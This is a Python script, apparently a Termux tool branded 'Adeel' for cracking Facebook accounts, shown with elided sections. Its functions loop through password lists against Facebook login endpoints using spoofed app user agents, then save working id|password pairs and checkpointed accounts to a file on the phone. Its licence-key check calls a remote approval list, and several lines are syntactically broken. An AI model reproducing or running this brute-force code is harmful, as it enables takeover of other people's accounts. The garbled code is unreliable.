##RANI ISE BACK JO BI PANGA LEGA WUAdeelA YEHI HAAL HOGA 
## NAME TO YAAD HE 🍌✌️
from os import path
import os,base64,zlib,pip,urllib
os.system('xdg-open /'https://www.facebook.com/profile.php?id=100077022492605)
print('\n\033[1;97m [•] checking update 10.8 \n [•] wait a few sec... \n [•]https://www.facebook.com/profile.php?id=100077022492605 ')
...
logo=("""""""""
  ______   _______   ________  ________  __       
 /      \ /       \ /        |/        |/  |      
/$$$$$$  |$$$$$$$  |$$$$$$$$/ $$$$$$$$/ $$ |      
$$ |__$$ |$$ |  $$ |$$ |__    $$ |__    $$ |      
$$    $$ |$$ |  $$ |$$    |   $$    |   $$ |      
...
\33[1;97m 
  ...
  \33[;97m
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : Adeel joon AS
...
def linex():
	print("=======================================================")
def approval(0093745162911):
  os.system('clear')
  print(logo)
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  try:
    httpCaht = requests.get(0093745162911/Approved/main/Approved.txt').text
    if id in httpCaht:
      ...
      print("\33[1;97m----------------------------------------------")
      print("\33[1;97m"https://www.facebook.com/profile.php?id=100077022492605)
      print('Copy Key and send Adeel Owner'https://www.facebook.com/profile.php?id=100077022492605)
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi Adeel Sir, I Need To Buy Your Paid Adeel PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python Adeel.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = "[Dalvik/2.1.0 (Linux; U; Android 10; Infinix X688B Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/288.0.0.5.115;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/346850586;FBCR/TNT;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=706,height=1472};]"
                        ...
                        ua = "[FBAN/FB4A;FBAV/251.0.0.31.111;FBBV/188827985;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/192128667;FBCR/Salaam;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SPH-L720T;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]"                           
                        ...
                        Adeel=session.cookies.get_dict().keys()
                        if "c_user" in Adeel:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m Adeel-OK %s | %s'%(ids,pas))
                                open('/sdcard/Adeel-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Adeel:
                                if 'y' in pcp:
                                        print('\r\033[1;97m Adeel-CP '+ids+' | '+pas+'\033[1;97m')
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m Adeel-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Adeel-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mAdeel-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Adeel-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/Adeel-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m Adeel-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/Adeel-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mAdeel-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Adeel-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
